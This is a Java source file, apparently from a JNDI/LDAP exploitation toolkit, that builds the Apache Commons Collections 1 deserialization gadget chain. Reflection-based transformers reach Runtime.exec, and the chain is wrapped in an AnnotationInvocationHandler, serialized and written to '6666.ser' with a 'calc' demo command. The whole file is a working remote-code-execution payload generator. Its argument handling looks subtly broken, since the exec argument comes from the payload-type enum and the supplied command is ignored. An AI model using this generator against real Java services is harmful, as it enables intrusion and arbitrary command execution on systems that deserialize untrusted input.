package com.feihong.ldap.gadgets;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Gadgets;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous = new FileOutputStream("6666.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        final String[] execArgs = new String[] {String.valueOf(type)};
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        ChainedTransformer inertChain = new ChainedTransformer(transformers);
        Map hashMap = new HashMap();
        // 这个值不可改
        hashMap.put("value", SuppressWarnings.class);
        // sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来
        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        // 最终调用链是 readObject 时的 setValue -> transformedMap.setValue -> chained
        Map tm = TransformedMap.decorate(hashMap, new ConstantTransformer(0), inertChain);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(SuppressWarnings.class, tm);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(handler);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
